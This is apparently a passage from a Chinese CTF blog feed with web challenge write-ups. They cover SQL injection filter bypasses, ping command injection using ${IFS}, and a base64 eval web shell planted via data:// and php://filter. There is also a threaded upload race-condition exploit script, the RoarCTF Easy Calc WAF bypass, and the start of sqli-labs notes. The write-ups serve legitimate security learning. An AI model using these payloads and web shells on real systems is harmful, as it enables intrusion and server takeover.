class="token punctuation">[</span><span class="token string">"LionTreeNB"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> string<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span> <span class="token string">"username,passwd,data"</span> &#125;payload4: ?<span class="token keyword">sql</span><span class="token operator">=</span>selselectect <span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span>selselectect  group_concat<span class="token punctuation">(</span><span class="token keyword">data</span><span class="token punctuation">)</span><span class="token keyword">from</span> users<span class="token punctuation">)</span>结果: array<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> &#123; <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> string<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"1"</span> <span class="token punctuation">[</span><span class="token string">"LionTreeNB"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> string<span class="token punctuation">(</span><span class="token number">35</span><span class="token punctuation">)</span> <span class="token string">"flag&#123;43195f93e91cce76f01c1b26957c1&#125;"</span> &#125; </code></pre><h2 id="easy-ping"><a href="#easy-ping" class="headerlink" title="easy_ping"></a>easy_ping</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\s/"</span><span class="token punctuation">,</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no space!!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ping -c 4 "</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>空格过滤<br><pre class="language-none"><code class="language-none">payload1: ?ip&#x3D;0.0.0.0;cd$&#123;IFS&#125;&#x2F;;ls$&#123;IFS&#125;-a结果: . .. .dockerenv bin boot dev etc flag.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var;payload2: ?ip&#x3D;0.0.0.0;cd$&#123;IFS&#125;&#x2F;;cat$&#123;IFS&#125;flag.txt结果: flag&#123;3582efdc7ae760fa3fccbe41493&#125;</code></pre></p><h2 id="easy-include"><a href="#easy-include" class="headerlink" title="easy_include"></a>easy_include</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//flag in /flag.php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"phpinfo"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/filter/"</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no filter!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>过滤filter，可以使用data://数据流封装来执行php代码,那就直接挂马。<br><pre class="language-none"><code class="language-none">payload: ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgZXZhbChAJF9QT1NUWydhJ10pOyA&#x2F;Pg&#x3D;&#x3D;然后使用蚁剑连接即可。</code></pre></p><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"upload/"</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"upload/"</span><span class="token operator">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"this is a php file!!!!!"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"upload/"</span><span class="token operator">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token comment">&lt;!-- this file-uploading isn't that easy ...... --></span></code></pre><p>首先move_uploaded_file一般用来保存上传的文件。 unlink函数用来删除文件，如果我们已经上传webshell，但是后面又有unlink，那么此时第一反应肯定是条件竞争。考虑到php是串行处理任务，那可以多线程执行创建-访问-删除的任务，进而挂马。下面是exp.py。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> requests<span class="token keyword">import</span> threading<span class="token keyword">class</span> <span class="token class-name">RaceCondition</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>url <span class="token operator">=</span> <span class="token string">"http://2021summer.inhann.top:50005/upload/shell0.php"</span>        self<span class="token punctuation">.</span>uploadUrl <span class="token operator">=</span> <span class="token string">"http://2021summer.inhann.top:50005/"</span>    <span class="token keyword">def</span> <span class="token function">_get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'try to call uploaded file...'</span><span class="token punctuation">)</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">)</span>        <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]create file info.php success"</span><span class="token punctuation">)</span>            os<span class="token punctuation">.</span>_exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">_upload</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"upload file....."</span><span class="token punctuation">)</span>        <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"file"</span><span class="token punctuation">:</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"shell0.php"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>        requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>self<span class="token punctuation">.</span>uploadUrl<span class="token punctuation">,</span> files<span class="token operator">=</span><span class="token builtin">file</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>_get<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>_upload<span class="token punctuation">(</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>_get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    threads <span class="token operator">=</span> <span class="token number">10</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>threads<span class="token punctuation">)</span><span class="token punctuation">:</span>        t <span class="token operator">=</span> RaceCondition<span class="token punctuation">(</span><span class="token punctuation">)</span>        t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>threads<span class="token punctuation">)</span><span class="token punctuation">:</span>        t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>下面是shell0.php的源码：<br><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'info.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&lt;?php phpinfo();?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span></code></pre></p><h2 id="easy-shell"><a href="#easy-shell" class="headerlink" title="easy_shell"></a>easy_shell</h2><pre class="language-php" data-language="php"><code class="language-php">?src=1string(41) "uploads/16bebaa6795a6d29635ae505fab74742/"抱着试一试的心态:payload: ?src=1源码显露出来了。error_reporting(0);echo "?src=1";$dir='uploads/';if (!is_dir($dir)) &#123;    mkdir($dir,0755);&#125;$dir = "uploads/".md5($_SERVER['REMOTE_ADDR']).'/';var_dump($dir);if (!is_dir($dir)) &#123;    mkdir($dir,0755);&#125;$content = '<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">exit</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>';$content .= $_POST['txt'];$prefix=$_POST['prefix'];$name=$_POST['name'];if(strpos('./',$prefix) or strpos('./',$name))&#123;    die("?");&#125;$filename=$prefix.$dir.$name;file_put_contents($filename, $content);if (isset($_GET['src']))&#123;highlight_file(__FILE__);&#125;<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>//flag is in /flag?></code></pre><p>发现存在file_put_contents函数。<br>由于base64编码中只包含64个可打印字符，在解码的时候，遇到这64个之外的字符，就会略过并且base64解码是四个byte一组，所以再增加一个字符，凑够两组，后面的就会正常解码<br>所以可以利用php://filter流的base64_decode函数特性去除exit。<br><pre class="language-php" data-language="php"><code class="language-php">payload<span class="token punctuation">:</span> url<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token comment">//1.15.145.49:83/index.php?src=1</span><span class="token constant">POST</span><span class="token punctuation">:</span> prefix<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/write=convert.base64-decode/resource=&amp;name=shell.php&amp;txt=aPD9waHAgZXZhbChAJF9QT1NUWydhJ10pOyA/Pg==</span>之后使用蚁剑连接http<span class="token punctuation">:</span><span class="token comment">//1.15.145.49:83/uploads/16bebaa6795a6d29635ae505fab74742/shell.php</span>即可。</code></pre></p><h2 id="全新OJ上线辣"><a href="#全新OJ上线辣" class="headerlink" title="全新OJ上线辣"></a>全新OJ上线辣</h2><p>没做出来，把这题A了，orz<br>A的代码，用的筛法+二分，没有python模板，网上找的。<br><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">sieve_of_eratosthenes</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    primes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token boolean">True</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>    p <span class="token operator">=</span> <span class="token number">2</span>    <span class="token keyword">while</span> p <span class="token operator">*</span> p <span class="token operator">&lt;=</span> n<span class="token punctuation">:</span>        <span class="token keyword">if</span> primes<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>p <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">,</span> n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">:</span>                primes<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">False</span>        p <span class="token operator">+=</span> <span class="token number">1</span>    primes <span class="token operator">=</span> <span class="token punctuation">[</span>element <span class="token keyword">for</span> element <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token keyword">if</span> primes<span class="token punctuation">[</span>element<span class="token punctuation">]</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> primes<span class="token punctuation">;</span><span class="token keyword">def</span> <span class="token function">search</span><span class="token punctuation">(</span>nums<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">,</span> target<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>    left<span class="token punctuation">,</span> right <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span>    <span class="token keyword">while</span> left <span class="token operator">&lt;=</span> right<span class="token punctuation">:</span>        pivot <span class="token operator">=</span> left <span class="token operator">+</span> <span class="token punctuation">(</span>right <span class="token operator">-</span> left<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>        <span class="token keyword">if</span> nums<span class="token punctuation">[</span>pivot<span class="token punctuation">]</span> <span class="token operator">==</span> target<span class="token punctuation">:</span>            <span class="token keyword">return</span> pivot        <span class="token keyword">if</span> target <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>pivot<span class="token punctuation">]</span><span class="token punctuation">:</span>            right <span class="token operator">=</span> pivot <span class="token operator">-</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            left <span class="token operator">=</span> pivot <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    x<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    x<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>    primes<span class="token operator">=</span>sieve_of_eratosthenes<span class="token punctuation">(</span>x<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>    n<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>primes<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token operator">%</span>primes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> search<span class="token punctuation">(</span>primes<span class="token punctuation">,</span>x<span class="token operator">/</span>primes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>flag<span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>                exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre><br>CTF：TODO</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF WEB [RoarCTF 2019]Easy Calc</title>
      <link href="/2021/08/17/BUUCTF-WEB-RoarCTF-2019-Easy-Calc/"/>
      <url>/2021/08/17/BUUCTF-WEB-RoarCTF-2019-Easy-Calc/</url>
      
        <content type="html"><![CDATA[<h3 id="前置知识点"><a href="#前置知识点" class="headerlink" title="前置知识点"></a>前置知识点</h3><ol><li><p>php字符串解析特性<br> PHP会将查询字符串（在URL或正文中）转换为内部关联数组<code>$_GET</code>或关联数组<code>$_POST</code>,例如会将 <code>/?foo=bar变成Array([foo] =&gt; “bar”)</code>。</p><p> 然而查询字符串在解析的过程中会将某些字符删除或用下划线代替，如<code>/?%20news[id%00=42</code>会转换为<code>Array([news_id] =&gt; 42)</code>。</p><p> 如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：<code>/news.php?%20news[id%00=42&quot;+AND+1=0–</code>这句话的意思就是<code>$_GET[&quot;news_id&quot;]=42&quot;+AND+1=0-</code></p><p> |User_Input|Decode_PHP|variable name|<br> |-|-|-|<br> %20foo_bar%00|foo_bar|foo_bar|<br> foo%20bar%00|foo bar|foo bar|<br> foo%5bbar|foo[bar|foo_bar</p></li><li>使用chr()函数绕过匹配</li></ol><p>num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</p><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>打开题目，F12查看源代码<br><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!--I've set up WAF to ensure security.--></span>    $('#calc').submit(function()&#123;        $.ajax(&#123;            url:"calc.php?num="+encodeURIComponent($("#content").val()),            type:'GET',            success:function(data)&#123;                $("#result").html(`<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>alert alert-success<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>strong</span><span class="token punctuation">></span></span>答案:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>strong</span><span class="token punctuation">></span></span>$&#123;data&#125;            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>`);            &#125;,            error:function()&#123;                alert("这啥?算不来!");            &#125;        &#125;)        return false;    &#125;)</code></pre><br>发现有calc.php文件并且网页开启了WAF。<br>打开calc.php 文件，查看源代码<br><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\t'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\r'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\n'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'`'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\['</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\]'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\$'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\^'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$blackitem</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you want to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo '</span><span class="token operator">.</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><br>发现了过滤机制，虽然WAF防御了<code>num</code>变量，但是并没有防御<code>%20num</code>,于是可以使用空格绕过WAF，然后使用eval执行命令。使用<code>chr()</code>函数绕过黑名单，使用<code>var_dump(scandir(chr(47)))</code>查看数组，发现存在f1agg文件，构造<code>payload=num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</code>即找到flag。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Sqli-lab 刷题记录</title>
      <link href="/2021/08/15/Sqli-lab-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2021/08/15/Sqli-lab-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="Preparation："><a href="#Preparation：" class="headerlink" title="Preparation："></a>Preparation：</h2><p>为了不干扰本地搭建的环境，我的sql-lab是使用docker跑起来的。Win10 家庭版搭建起来比较繁琐，我使用的是 hyper-v + windows + docker for windows 跑的，命令比较简单，就只有两句话。<br><pre class="language-docker" data-language="docker"><code class="language-docker">docker pull acgpiano/sqli-labsdocker run -dt --name sqli-lab -p [你要映射的端口]:80 acgpiano/sqli-labs:latest</code></pre></p><h2 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h2><ol><li><p>列举一下sql的基础语句，学了好久了，感觉要忘光了orz。</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> <span class="token keyword">databases</span><span class="token punctuation">;</span>         <span class="token comment">//查看数据库</span><span class="token keyword">use</span> xxx<span class="token punctuation">;</span>                <span class="token comment">//使用某个数据库</span><span class="token keyword">show</span> <span class="token keyword">tables</span><span class="token punctuation">;</span>            <span class="token comment">//查看该数据库的数据表</span><span class="token keyword">desc</span> xxx<span class="token punctuation">;</span>               <span class="token comment">//查看该数据表的结构</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> xxx<span class="token punctuation">;</span>      <span class="token comment">//查找某个数据表的所有内容</span><span class="token keyword">select</span> schema_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata<span class="token punctuation">;</span>        <span class="token comment">//猜数据库</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'xxxxx'</span><span class="token punctuation">;</span>                                <span class="token comment">//猜某数据库的数据表</span><span class="token keyword">Select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'xxxxx'</span><span class="token punctuation">;</span>                                <span class="token comment">//猜某表的所有列</span><span class="token keyword">left</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>       <span class="token comment">//从左侧截取 a 的前 b 位</span><span class="token function">mid</span><span class="token punctuation">(</span>column_name<span class="token punctuation">,</span><span class="token keyword">start</span><span class="token punctuation">[</span><span class="token punctuation">,</span>length<span class="token punctuation">]</span><span class="token punctuation">)</span>     <span class="token comment">//从位置start开始，截取column_name字符串的length位，与substr作用相同</span>substr<span class="token punctuation">(</span>string<span class="token punctuation">,</span> <span class="token keyword">start</span><span class="token punctuation">,</span> length<span class="token punctuation">)</span>       <span class="token comment">//从位置start开始，截取字符串string的length长度，与mid作用相同</span>ascii<span class="token punctuation">(</span><span class="token punctuation">)</span>         <span class="token comment">//将某个字符转换成ascii码</span>ord<span class="token punctuation">(</span><span class="token punctuation">)</span>           <span class="token comment">//将某个字符转换成ascii码，同ascii()</span></code></pre></li><li><p>报错注入的原理<br>在mysql高版本（大于5.1版本）中添加了对XML文档进行查询和修改的函数：updatexml()和extractvalue()<br>当这两个函数在执行时，如果出现xml文档路径错误就会产生报错<br>利用select count(<em>),floor(rand(0)</em>2)x from information_schema.character_sets group by 